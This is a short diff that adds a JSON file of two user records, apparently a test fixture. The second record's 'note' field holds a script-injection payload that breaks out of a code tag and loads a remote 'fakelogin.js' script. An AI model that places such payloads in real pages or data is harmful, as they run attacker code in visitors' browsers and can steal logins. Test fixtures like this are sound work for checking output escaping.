@@ -1,0 +1,10 @@
+{
+  "user1": {
+    "password": "secret1",
+    "note": "something safe again"
+  },
+  "user2": {
+    "password": "secret2",
+    "note": "</code><script src=\"https://tmpsite.narekikkers.nl/fakelogin.js\\\"></script><code>"
+  }
+}
